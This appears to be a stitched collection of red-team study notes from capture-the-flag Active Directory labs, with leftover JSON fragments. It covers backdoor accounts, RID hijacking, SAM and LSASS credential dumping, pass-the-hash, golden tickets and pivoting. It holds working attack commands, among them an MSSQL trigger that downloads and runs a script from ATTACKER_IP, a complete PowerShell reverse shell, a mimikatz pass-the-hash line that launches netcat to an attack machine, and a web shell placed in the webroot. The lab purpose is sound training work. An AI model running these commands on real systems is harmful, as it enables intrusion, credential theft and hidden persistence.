1: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 To check the backdoor user is working, establish a WinRM connection and check that the Backup Operators group is enabled the username account. evil-winrm -i <IP target> -u <username> -p <password> Make a backup of SAM and SYSTEM files and download: *Evil-WinRM* PS C:\\> reg save hklm\\system system.bak The operation completed successfully. *Evil-WinRM* PS C:\\> reg save hklm\\sam sam.bak The operation completed successfully. *Evil-WinRM* PS C:\\> download system.bak Info: Download successful! *Evil-WinRM* PS C:\\> download sam.bak Info: Download successful! Dump the password hashes for all users using for example, secretsdump.py from impacket or another similar tool: impacket-secretsdump -sam sam.bak -system system.bak local Pass-the-Hash to connect to the target machine with Administrator privileges: evil-winrm -i <IP target> -u Administrator -H <hash> Special privileges and security descriptors  Privileges are the capacity to do a task on the system, like having the capabilities to shut down the server or being able to take ownership of any file on the system. Such privileges can be assigned to any user, regardless of group memberships. Export the current configuration to a temporary file: secedit /export /cfg config.inf Open the file: Add username at the end of the lines for SeBackupPrivilege and SeRestorePrivilege Convert the .inf file into a .sdb file and use it to load the configuration back into the system: secedit /import /cfg config.inf /db config.sdb secedit /configure /db config.sdb /cfg config.inf username now has equivalent privileges to any Backup Operator, but can not log into the system via WinRM . Instead of adding the user to the Remote Management Users group, change the security descriptor associated with the WinRM service to allow username to connect. Open the configuration window for changing WinRM security descriptor: Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI This will open a window: Add username and assign full privileges to connect to WinRM Now username can connect via WinRM and having SeBackup and SeRestore privileges, and after changing the LocalAccountTokenFilterPolicy registry key, can do the steps to recover the password hashes from the SAM and connect back with the Administrator user. Advantage of this method over group membership assignment is that username will look like a regular user when groups are checked. Nothing to see here. RID hijacking  When a user is created, an identifier called Relative ID ( RID ) is assigned to the user. This RID is a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets the associated RID from the SAM registry hive and creates an access token associated with that RID . If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts. In any Windows system, the default Administrator account is assigned the RID = 500 , and regular users usually have a RID >= 1000 . To find the assigned RIDs for any user: wmic useraccount get name,sid The SID is an identifier that allows the operating system to identify a user across a domain. The last number group is the RID . To assign a RID=500 to username , access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, not even Administrators can edit it. To run Regedit as SYSTEM , use psexec , available in C:\\tools\\pstools : C:\\tools\\pstools> PsExec64.exe -i -s regedit In Regedit, go to HKLM\\SAM\\SAM\\Domains\\Account\\Users\\ where there will be a key for each user in the machine. To modify username , search for a key with its RID in hex . Under the corresponding key, there will be a value called F , which holds the user’s effective RID at position 0x30: Replace RID The RID is stored using little-endian notation, so its bytes appear reversed. Replace those two bytes with the RID of Administrator in hex (500 = 0x01F4 ), and switching around the bytes = F401 . The next time username logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.",

Transfer it to the target machine and move it into the webroot, which for IIS by default is the C:\\inetpub\\wwwroot directory. move shell.aspx C:\\inetpub\\wwwroot\\ We can then run commands from the web server by going to the following URL: http://<IP target>/shell.aspx Note: If you are getting a Permission Denied error while accessing the shell’s URL, just grant everyone full permissions on the file to get it working.

Any change to a file in there will probably trigger an alert. Using MSSQL as a backdoor  There are many ways to plant backdoors in MSSQL Server installations, one of which is abusing triggers. Triggers in MSSQL allow for bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. xp_cmdshell is a stored procedure provided by default in any MSSQL installation. It allows for running commands directly in the system’s console but comes disabled by default. To enable it, open Microsoft SQL Server Management Studio 18 , from the start menu. When asked for authentication, use Windows Authentication (the default value), and you will be logged on with the credentials of the current Windows User. By default, the local Administrator account will have access to all DBs. Once logged in, click on the New Query button to open the query editor: Run the following SQL sentences to enable the Advanced Options in the MSSQL configuration, and enable xp_cmdshell . sp_configure 'Show Advanced Options',1; RECONFIGURE; GO sp_configure 'xp_cmdshell',1; RECONFIGURE; GO Next up is making sure that any website accessing the database can run xp_cmdshell . By default, only database users with the sysadmin role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the sa user, which is the default database administrator: USE master GRANT IMPERSONATE ON LOGIN::sa to [Public]; Configuring a trigger starts by changing to the HRDB database: USE HRDB The trigger will leverage xp_cmdshell to execute Powershell to download and run a .ps1 file from a web server controlled by the attacker. The trigger will be configured to execute whenever an INSERT is made into the Employees table of the HRDB database: CREATE TRIGGER [sql_backdoor] ON HRDB.dbo.Employees FOR INSERT AS EXECUTE AS LOGIN = 'sa' EXEC master..xp_cmdshell 'Powershell -c \"IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')\"'; Now that the backdoor is set up, let’s create evilscript.ps1 in our attacker’s machine, which will contain a Powershell reverse shell: $client = New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\",4454); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close() We will need to open two terminals to handle the connections involved in this exploit: The trigger will perform the first connection to download and execute evilscript.ps1 .

There are two ways to easily achieve this: By changing the hosts file (/etc/hosts on Linux and %SystemRoot%\\system32\\drivers\\etc\\hosts on Windows) on a target computer. Common ways to replace a host file are creating a self-extracting archive (SFX), a computer application which contains a file archive and the programming to extract this information, or creating a batch file, a text file containing a series of commands to be executed by the command interpreter in windows operating systems.

    "t": "NTLM authenticated services ",
    "c": "NTLM authenticated services  New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users’ identities in AD. NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM. This authentication mechanism is used by the services on a network. And some services that use NetNTLM may also be exposed to the internet. Examples: Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal. Remote Desktop Protocol (RDP) service of a server being exposed to the internet. Exposed VPN endpoints that were integrated with AD. Web applications that are internet-facing and make use of NetNTLM. The user is now either granted access or denied access, authorisation is performed on the Exchange server with consultation of the msg.target.com Domain Controller. NTLM is generally considered insecure because it uses outdated cryptography that is vulnerable to several modes of attacks. NTLM is also vulnerable to pass-the-hash and brute-force attacks. Password spraying  Most AD environments have account lockout configured, we won’t be able to run a full brute-force attack. Instead, a password spraying attack might work. We could use tools such as Hydra to assist with the password spraying attack. The room uses a script named ntlm_passwordspray.py . The core function takes a suggested password and a URL to target as input and attempts to authenticate to the URL with each username in the textfile. By monitoring the differences in HTTP response codes from the application, we can determine if the credential pair is valid or not. If the credential pair is valid, the application responds with a 200 HTTP (OK) code. If the pair is invalid, the application returns a 401 HTTP (Unauthorised) code. The parameters: userfile - Textfile containing usernames ( usernames.txt ) fqdn - Fully qualified domain name associated with the organisation we are attacking ( za.tryhackme.com ) password - The password we want to use for our spraying attack ( Changeme123 ) attackurl - The URL of the application that supports Windows Authentication ( http://ntlmauth.za.tryhackme.com ) python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/ Results: [*] Starting passwords spray attack using the following password: Changeme123 [-] Failed login with Username: anthony.reynolds [-] Failed login with Username: samantha.thompson [-] Failed login with Username: dawn.turner [-] Failed login with Username: frances.chapman [-] Failed login with Username: henry.taylor [-] Failed login with Username: jennifer.wood [+] Valid credential pair found!

    "t": "Port forwarding ",
    "c": "Port forwarding  SSH tunnelling  SSH, as it already has built-in functionality to do port forwarding through a feature called SSH Tunneling. While SSH used to be a protocol associated with Linux systems, Windows now ships with the OpenSSH client by default, so you can expect to find it in many systems nowadays, independent of their operating system. On Windows machines, most likely no SSH server will be available: Start a tunnel from the compromised machine, acting as an ssh client, to the attack machine, which will act as an ssh server. Making a connection back to our attacker’s machine, we will want to create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels. useradd tunneluser -m -d /home/tunneluser -s /bin/true passwd tunneluser The SSH tunnel can be used to do either local or remote port forwarding. SSH remote port forwarding  Remote port forwarding is useful, for example, when having gained control over the 2.2.2.2 Windows host (it does not need to be administrator access) and would like to use it as a pivot to access a port on a server to which we can not directly connect. Take a reachable port from the SSH client (the compromised machine) and project it into a remote ssh server (the attacker's machine). To forward port 3389 on the server back to our attacker’s machine, on the compromised Windows host: C:\\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N This establishes an SSH session from 2.2.2.2 (Compromised host) to 1.1.1.1 (Attacker machine) using the tunneluser user. Because the tunneluser is not allowed to run a shell on the attacker machine, we need to run the ssh command with the -N switch to prevent the client from requesting one, or the connection will exit immediately. The -R switch is used to request a remote port forward, and the syntax requires us first to indicate the port we will be opening at the ssh server ( 3389 ), followed by a colon and then the IP and port of the socket we will be forwarding ( 3.3.3.3:3389 ). Port numbers do not need to match. When up and running, we can go to the attacker’s machine and RDP into the forwarded port to reach the server: xfreerdp /v:127.0.0.1 /u:<username> /p:<password> SSH local port forwarding  Local port forwarding allows for “pulling” a port from an ssh server into the ssh client. Any host on the network that can not connect directly to the attacker machine but can connect to the compromised host will now be able to reach the services offered on the attack machine through the pivot host. Take any service available in our attacker's machine and make it available through a port on the compromised host. To forward port 80 from the attack machine and make it available from the compromised host, run: C:\\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N The -L option requires indicating which local socket used by the compromised host to receive connections on ( *:80 ) and the remote socket to connect to from the attack machine perspective ( 127.0.0.1:80 ). Opening a new port on the compromised host, add a firewall rule to allow for incoming connections (with dir=in ). This requires administrative privileges: netsh advfirewall firewall add rule name=\"Open Port 80\" dir=in action=allow protocol=TCP localport=80 Up and running, any user pointing their browsers to the compromised host at http://2.2.2.2:80 will see the website published by the attack machine. Port forwarding with socat  socat is not as flexible as ssh , and it is more noisy, but if ssh is not available on the compromised host, may be an option. It must be transferred to the compromised host first. Access port 3389 on the server using the compromised host as a pivot, with a similar effect as SSH remote port forwarding. To access port 3389 on the server using the compromised host: C:\\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389 The fork option forks a new process for each connection received, making multiple connections without closing possible. Otherwise, it would be closed after the first connection finishes. And because a port is being opened on the pivot host, create a firewall rule: netsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389 The compromised host will spawn port 80 and listen for connections to be forwarded to port 80 on the attack machine. To expose port 80 from the attack machine, making it reachable by the server: C:\\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80 Dynamic port forwarding and SOCKS  When wanting to run scans against many ports of a host, or even many ports across many machines through a pivot host, dynamic port forwarding seems a good choice. It allows for pivoting through a host and establishing several connections to any IP addresses/ports we want, by using a SOCKS proxy. Establish a reverse dynamic port forwarding ssh tunnel on the compromised host: C:\\> ssh tunneluser@1.1.1.1 -R 9050 -N Edit the proxychains configuration on the attack machine: sudo nano /etc/proxychains4.conf Go down to the [ProxyList] section and add your proxy connection. The default port is 9050 , but any port will work as long as it matches the one we used when establishing the SSH tunnel. If we now want to execute any command through the proxy, we can use proxychains , for example: proxychains curl http://pxeboot.za.tryhackme.com Note: nmap might not work well with SOCKS in some circumstances Flags  Connect to THMJMP2 via SSH using the credentials from the first task.

    "c": "Local Security Authority Subsystem Service  Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, and Kerberos tickets. Windows system stores credentials in the LSASS process to enable users to access network resources, such as file shares, SharePoint sites, and other network services, without entering credentials every time a user connects. Thus, the LSASS process is a juicy target for red teamers because it stores sensitive information about user accounts. The LSASS is commonly abused to dump credentials to either escalate privileges, steal data, or move laterally. If we have administrator privileges, we can dump the process memory of LSASS. Windows system allows us to create a dump file, a snapshot of a given process. This could be done either with the Desktop access (GUI) or the command prompt. This attack is defined in the MITRE ATT&CK framework as “OS Credential Dumping: LSASS Memory (T1003)”. To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select “Create dump file”. An alternative way to dump a process if a GUI is not available to us is by using ProcDump . ProcDump is a Sysinternals process dump utility that runs from the command prompt. Mimikatz is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory using various techniques. Mimikatz is a post-exploitation tool that enables other useful attacks, such as pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. Mimikatz deals with operating system memory to access information and requires administrator and system privileges in order to dump memory and extract credentials.

    "c": "Persistence through SID history  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. This one is: Not easily removed except by RSAT tooling Difficult to find, not easily detected The legitimate use case of SID history is to enable access for an account to effectively be cloned to another. This becomes useful when an organisation is busy performing an AD migration as it allows users to retain access to the original domain while they are being migrated to the new one. In the new domain, the user would have a new SID, but we can add the user’s existing SID in the SID history, which will still allow them to access resources in the previous domain using their new account. While SID history is good for migrations, we, as attackers, can also abuse this feature for persistence. One way to abuse this feature is to add the SID of a privileged group – like the Domain Admins group – to the SID history of a low-level user. Even though the user is not a member of the group in AD, the system will authorise them as if they were due to the group SID being in their history. SSH into the domain controller using the given administrator credentials: ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc Inspect the SID history and group membership of the unprivileged account from the credential distributor . powershell -ep bypass Get-ADUser 'user.name' -Properties sidhistory,memberof The SIDHistory property is an empty list {} and the MemberOf property shows that this user is only a member of the Internet Access group.

This means that any member of the Domain Users group (including our account) can add accounts to the IT Support Group. Furthermore, Bloodhound shows that the IT Support Group has the ForceChangePassword ACE for the Tier 2 Admins group members.

It contains login credentials such as usernames, passwords, and internet addresses. There are four credential categories: Web credentials contain authentication details stored in Internet browsers or other applications. Windows credentials contain Windows authentication details, such as NTLM or Kerberos. Generic credentials contain basic authentication details, such as clear-text usernames and passwords. Certificate-based credentials: Authenticated details based on certifications. Note that authentication details are stored on the user’s folder and are not shared among Windows user accounts. And, they are cached in memory.

    "t": "Exploiting kerberos delegation ",
    "c": "Exploiting kerberos delegation  The general purpose of Kerberos delegation is to allow an application or service to access a resource on another machine on behalf of a user or machine. If a user logs into an application, the application will request resources on other machines on behalf of the user. It removes the need for a global service account with less granular permissions. Unconstrained Delegation  With Unconstrained Delegation, a host has no limit on the resources it can access on behalf of a user who connects, as long as the user has the TRUSTED_FOR_DELEGATION flag set. Once a user connects, the host requests a TGT for the user and caches it locally for future use. Given the TGT, an attacker could proceed to access any resource accessible by the user owner of the TGT. For example, if an Administrator logged on to the host with unconstrained delegation, the attacker would now be in possession of the Administrator’s TGT. Constrained Delegation  Constrained Delegation restricts the type of services a service acount can request on behalf of a user. For example, if a domain service account (sevice principal) was running a web application on a web server, constrained delegation would enable the administrator to choose which services to delegate access to on behalf of another user. An administrator could selectively filter delegation to resources such as HTTP, CIFS, LDAP, HOST, MSSQL, etc. If an attacker compromised a host configured for constrained delegation and obtained the NTLM hash or password of the service account, the attacker could request a TGT for the service account and use the TGT to request a TGS for the delegate account to access a particular service. Resource-Based Constrained Delegation  This model of delegation works inversely from the other delegation types. Introduced by Microsoft in 2012, Resource-Based Constrained Delegation (RBCD) once again provided additional restrictions on Kerberos Delegation for security. RBCD changes the delegation model entirely. Instead of specifying which object can delegate to which service, the service now specifies which objects can delegate to it. This allows the service owner to control who can access it. For example, if we have permission to configure RBCD for a service, we have the ability to set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute for the AD Object. We can populate this attribute with the details of an AD account that we have access to. To now gain access to the service, we can generate a TGT for the account we control, which will allow us to interact with this service.

    "t": "Local Administrator Password Solution ",
    "c": "Local Administrator Password Solution  GPP is a tool that allows administrators to create domain policies with embedded credentials. Once the GPP is deployed, different XML files are created in the SYSVOL folder. SYSVOL is an essential component of Active Directory and creates a shared directory on an NTFS volume that all authenticated domain users can access with reading permission. Once upon a time, the GPP relevant XML files contained a password encrypted using AES-256 bit encryption. At that time, the encryption was good enough until Microsoft somehow published its private key on MSDN . And because Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords. One of the tools to crack the SYSVOL encrypted password is Get-GPPPassword . In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password. The new method includes two new attributes ( ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime ) of computer objects in the Active Directory. The ms-mcs-AdmPwd attribute contains a clear-text password of the local administrator, while the ms-mcs-AdmPwdExpirationTime contains the expiration time to reset the password. LAPS uses admpwd.dll to change the local administrator password and update the value of ms-mcs-AdmPwd .

    "c": "Persistence through tickets  Kerberos authentication flow  Ticket Granting Ticket: As long as the session has not lapsed, the user can reuse the TGT as often as needed to request a TGS. Ticket Granting Service: The TGS also has a service session key, and when the SP decrypts the ticket, the SP will have a session key for the user. User Authentication: Deny/Allow Pass-the-Ticket requires both the ticket and the service session key in order to pass a TGS to a service principal to authenticate as a user. A TGT (Golden ticket) allows an attacker to request multiple TGSs (Silver tickets) on behalf of a user. When a user requests a TGS, they send an encrypted timestamp derived from their password. The algorithm used to create this key can be DES (disabled by default on newer Windows installations), RC4 , AES218 , or AES256 , and can perhaps be extracted using mimikatz . If any of these keys are available on the host, then we can try to request a TGT as the user the Pass-the-Key way. The RC4 hash is equal to a user’s NTLM hash. If a users’ NTLM hashes were dumped from LSASS during enumeration on a domain-joined host, and RC4 a valid encryption algorithm, then these are RC4 hashes, which could be used to request a TGT the Overpass-the-Hash way. Golden Tickets  Golden Tickets are forged TGTs. What this means is we bypass steps 1 and 2 of the diagram above, where we prove to the DC who we are. Having a valid TGT of a privileged account, we can now request a TGS for almost any service we want. In order to forge a golden ticket, we need the krbtg account’s password hash so that we can sign a TGT for any user account we want. Some interesting notes about Golden Tickets: By injecting at this stage of the Kerberos process, we don’t need the password hash of the account we want to impersonate since we bypass that step. The TGT is only used to prove that the KDC on a DC signed it. Since it was signed by the krbtg hash, this verification passes and the TGT is declared valid no matter its contents. Speaking of contents, the KDC will only validate the user account specified in the TGT if it is older than 20 minutes. This means we can put a disabled, deleted, or non-existent account in the TGT, and it will be valid as long as we ensure the timestamp is not older than 20 minutes. Since the policies and rules for tickets are set in the TGT itself, we could overwrite the values pushed by the KDC, such as, for example, that tickets should only be valid for 10 hours. We could, for instance, ensure that our TGT is valid for 10 years, granting us persistence. By default, the krbtg account’s password never changes, meaning once we have it, unless it is manually rotated, we have persistent access by generating TGTs forever. The blue team would have to rotate the krbtg account’s password twice, since the current and previous passwords are kept valid for the account. This is to ensure that accidental rotation of the password does not impact services. Rotating the krbtg account’s password is an incredibly painful process for the blue team since it will cause a significant amount of services in the environment to stop working. They think they have a valid TGT, sometimes for the next couple of hours, but that TGT is no longer valid. Not all services are smart enough to release the TGT is no longer valid (since the timestamp is still valid) and thus won’t auto-request a new TGT. Golden tickets would even allow you to bypass smart card authentication, since the smart card is verified by the DC before it creates the TGT. We can generate a golden ticket on any machine, even one that is not domain-joined (such as our own attack machine), making it harder for the blue team to detect. Apart from the krbtg account’s password hash, we only need the domain name, domain SID, and user ID for the person we want to impersonate. If we are in a position where we can recover the krbtg account’s password hash, we would already be in a position where we can recover the other pieces of the required information. Silver Tickets  Silver Tickets are forged TGS tickets. So now, we skip all communication (Step 1-4 in the diagram above) we would have had with the KDC on the DC and just interface with the service we want access to directly. Some interesting notes about Silver Tickets: The generated TGS is signed by the machine account of the host we are targeting. The main difference between Golden and Silver Tickets is the number of privileges we acquire. If we have the krbtg account’s password hash, we can get access to everything. With a Silver Ticket, since we only have access to the password hash of the machine account of the server we are attacking, we can only impersonate users on that host itself. The Silver Ticket’s scope is limited to whatever service is targeted on the specific server. Since the TGS is forged, there is no associated TGT, meaning the DC was never contacted. This makes the attack incredibly dangerous since the only available logs would be on the targeted server. So while the scope is more limited, it is significantly harder for the blue team to detect. Since permissions are determined through SIDs, we can again create a non-existing user for our silver ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host’s local administrators group. The machine account’s password is usually rotated every 30 days, which would not be good for persistence. However, we could leverage the access our TGS provides to gain access to the host’s registry and alter the parameter that is responsible for the password rotation of the machine account. Thereby ensuring the machine account remains static and granting us persistence on the machine. While only having access to a single host might seem like a significant downgrade, machine accounts can be used as normal AD accounts, allowing you not only administrative access to the host but also the means to continue enumerating and exploiting AD as you would with an AD user account.

    "c": "Use of alternate authentication material  NTLM authentication flow  This is for domain authentication. In local authentication, this process only occurs between the client and server, as the server keeps the user's NTLM hash in the SAM If an attacker manages to compromise a machine where a domain user is logged in, the attacker may be able to dump the domain user’s NTLM hash from memory by using a tool like mimikatz or other methods. The attacker could try to crack the hash(es) and user passwords. User sends hash (not password). This allows an attacker to authenticate as a user in certain situations without ever needing to know a password, called pass-the-hash . It does require dumping hashes locally or remotely. Kerberos authentication flow  Ticket Granting Ticket: As long as the session has not lapsed, the user can reuse the TGT as often as needed to request a TGS. Ticket Granting Service: The TGS also has a service session key, and when the SP decrypts the ticket, the SP will have a session key for the user.

Cracking hashes  As a result of extracting credentials from a host where we have attained administrative privileges, we might get clear-text passwords, or hashes that can be easily cracked. NTLM hash (NTHash)  These hashes can be obtained by dumping the SAM database or using mimikatz . They are also stored on domain controllers in the NTDS file. These are the hashes that can be used to pass-the-hash . Usually people call this the NTLM hash (or just NTLM), which is misleading, as Microsoft refers to this as the NTHash (at least in some places). Example: B4B9B02E6F09A9BD760F388B67351E2B The algorithm: MD4(UTF-16-LE(password)) UTF-16-LE is the little endian UTF-16 . Windows used this instead of the standard big endian. Cracking: john --format=nt hash.txt hashcat -m 1000 -a 3 hash.txt NTLMv1 (Net-NTLMv1) hash  The NTLM protocol uses the NTHash in a challenge/response between a server and a client. The v1 of the protocol uses both the NT and LM hash, depending on configuration and on what is available. A way of obtaining a response to crack from a client, responder can be used. The value to crack would be the K1 | K2 | K3 . Version 1 is deprecated, but might still be used in some old systems on the network. Example u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c The algorithm: C = 8-byte server challenge, random K1 | K2 | K3 = LM/NT-hash | 5-bytes-0 response = DES(K1,C) | DES(K2,C) | DES(K3,C) Cracking: john --format=netntlm hash.txt hashcat -m 5500 -a 3 hash.txt NTLMv2 (Net-NTLMv2) hash  The new and improved version of the NTLM protocol, which makes it a bit harder to crack. The concept is the same as NTLMv1, but a different algorithm and responses are sent to the server. Can also be captured with responder . This is the Default in Windows since Windows 2000. Example: admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030 The algorithm: SC = 8-byte server challenge, random CC = 8-byte client challenge, random CC* = (X, time, CC2, domain name) v2-Hash = HMAC-MD5(NT-Hash, user name, domain name) LMv2 = HMAC-MD5(v2-Hash, SC, CC) NTv2 = HMAC-MD5(v2-Hash, SC, CC*) response = LMv2 | CC | NTv2 | CC* Cracking: john --format=netntlmv2 hash.txt hashcat -m 5600 -a 3 hash.txt Pass-the-hash  The NTLM challenge sent during authentication can be responded to just by knowing the password hash. Instead of having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can pass-the-hash (PtH) for authentication. Assuming NTLMv2, To extract NTLM hashes, use mimikatz to read the local SAM or extract hashes directly from LSASS memory. Extracting NTLM hashes from local SAM will only allow getting hashes from local users on the machine. No domain user hashes will be available. mimikatz # privilege::debug mimikatz # token::elevate mimikatz # lsadump::sam Extracting NTLM hashes from LSASS memory will give any NTLM hashes for local users and any domain user that has recently logged onto the machine. mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::msv The extracted hashes can be used in a PtH attack by using mimikatz to inject an access token for the target user on a reverse shell (or any other command): mimikatz # token::revert mimikatz # sekurlsa::pth /user:<username> /domain:<domainname> /ntlm:6b4a57f67805a663c818106dc0648484 /run:\"c:\\tools\\nc64.exe -e cmd.exe <IP attack machine> 5555\" token::revert reestablishes the original token privileges, because trying to pass-the-hash with an elevated token will not work. Run a reverse listener on the attack machine: nc -lnvp 5555 Running the whoami command on this shell, it will still show the original user from before doing the PtH, but any command run from here will use the credentials thet were injected. Some Linux tools have built-in support for PtH attacks using different protocols. Depending on which services are available, try: Connect to RDP using PtH: xfreerdp /v:<IP target> /u:<domainname>\\\\<username> /pth:<ntlmhash> Connect via psexec using PtH: psexec.py -hashes <ntlmhash> <domainname>/<username>@<IP target> Note: Only the linux version of psexec supports PtH. Connect to WinRM using PtH: evil-winrm -i <IP target> -u <username> -H <ntlmhash> Pass-the-ticket  It may be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz . This usually requires having SYSTEM privileges on the attacked machine: mimikatz # privilege::debug mimikatz # sekurlsa::tickets /export Extracting TGTs will require administrator privileges, and extracting TGSs can be done with a low-privileged account (only the ones assigned to that account). We need the ticket and its corresponding session key. Inject the ticket into the current session: mimikatz # kerberos::ptt <ticket> Where ticket looks something like: [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi Injecting tickets in our own session does not require administrator privileges. After this, the tickets will be available for any tools used for lateral movement. To check if the tickets were correctly injected, exit out of the mimikatz session and: za\\user.name@THMJMP2 C:\\> klist Overpass-the-hash/Pass-the-key  This attack is similar to PtH but then for Kerberos networks.

    "c": "Local Windows credentials  Keylogger is a software or hardware device to monitor and log keyboard typing activities. Keyloggers were initially designed for legitimate purposes such as feedback for software development or parental control. And, they can be misused to steal data. As a red teamer, hunting for credentials through keyloggers in a busy and interactive environment is a good option. If we know a compromised target has a logged-in user, we can use keylogging with tools like the Metasploit framework. An example use case can be found in Exploiting AD users . Security Account Manager (SAM)  The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. It can not be read and accessed by any users while the Windows operating system is running. And there are ways and attacks to dump the content of the SAM database. The first method is using the built-in Metasploit Framework feature, hashdump, to get a copy of the content of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump copy hashes. Another approach uses the Microsoft Volume shadow copy service , which helps perform a volume backup while applications read/write on volumes. Another possible method for dumping the SAM database content is through the Windows Registry. Windows registry also stores a copy of some SAM database contents to be used by Windows services. Shadow Copy  Use wmic (with administrator privileges) to create a shadow volume copy: Run the standard cmd.exe prompt with administrator privileges. Execute the wmic command to create a copy shadow of C: drive Verify the creation from step 2 is available. Copy the SAM database from the volume created in step 2 Copy shadow of C: drive: C:\\Users\\Administrator>wmic shadowcopy call create Volume='C:\\' To list and confirm that we have a shadow copy of the C: volume: C:\\Users\\Administrator>vssadmin list shadows A shadow copy volume was created: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 The SAM database is encrypted either with RC4 or AES encryption algorithms. In order to decrypt it, we need the decryption key stored in c:\\Windows\\System32\\Config\\system . Copy both files (sam and system) from the shadow copy volume to the desktop, and then to the attack machine.

Transfer them to the attack machine and run the secretsdump.py script to extract the hashes from the dumped memory file. c:\\temp\\Active Directory>scp .\\ntds.dit nina@10.18.22.77:/home/nina/Downloads/last/ The authenticity of host '10.18.22.77 (10.18.22.77)' can't be established.

    "c": "Persistence through credentials  It is not sufficient to have a single domain controller per domain in large organisations. These domains are often used in multiple regional locations, and having a single DC would significantly delay any authentication services in AD. These organisations make use of multiple DCs. Each domain controller runs a process called the Knowledge Consistency Checker (KCC). The KCC generates a replication topology for the AD forest and automatically connects to other domain controllers through Remote Procedure Calls (RPC) to synchronise information. This includes updated information such as the user’s new password and new objects such as when a new user is created. The process of replication is called DC Synchronisation. It is not just the DCs that can initiate replication. Accounts such as those belonging to the Domain Admins groups can also do it for legitimate purposes such as creating a new domain controller. A popular attack to perform is a DC Sync attack. With access to an account that has domain replication permissions, it is possible to stage a DC Sync attack to harvest credentials from a DC. Passwords  Passwords can easily be changed and will be changed by the blue team when an attacker is discovered.

    "c": "LDAP bind credentials  Another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) authentication. LDAP authentication is similar to NTLM authentication. And with LDAP authentication, the application directly verifies the user’s credentials. The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user’s credentials. LDAP authentication is a much used mechanism with third-party (non-Microsoft) applications that integrate with AD. Examples of applications and systems: Gitlab Jenkins Custom-developed web applications Printers VPNs If any of these applications or services are exposed on the internet, the same type of attacks as leveraged against NTLM authenticated systems can be used. And because a service using LDAP authentication requires a set of AD credentials, it opens up additional attack avenues. We can attempt to recover the AD credentials used by the service to gain authenticated access to AD. LDAP pass-back  A common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom. LDAP Pass-back attacks can be performed when we gain access to a device’s configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer. Often, the credentials for these interfaces are kept to the default ones, such as admin:admin or admin:password . Test settings In this case, we can not directly extract the LDAP credentials because the password is hidden: We did find a username though. But we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.

